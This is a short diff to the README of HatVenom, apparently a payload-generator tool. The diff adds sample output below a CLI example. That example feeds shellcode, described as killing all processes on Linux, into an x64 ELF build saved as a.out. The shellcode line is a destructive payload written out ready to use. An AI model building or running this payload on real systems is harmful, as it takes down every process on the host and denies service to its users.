@@ -126,4 +126,13 @@ Let's generate simple payload that kills all processes for Linux and save it to 
 python3 hatvenom.py --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
 ```
 
+**output:**
+
+```
+Generating payload...
+Final payload size: 131
+Saving payload to a.out...
+Payload saved to a.out
+```
+
 **NOTE:** If you want to use offsets in the CLI version of HatVenom, then you should use `--offsets one=1,two=2`
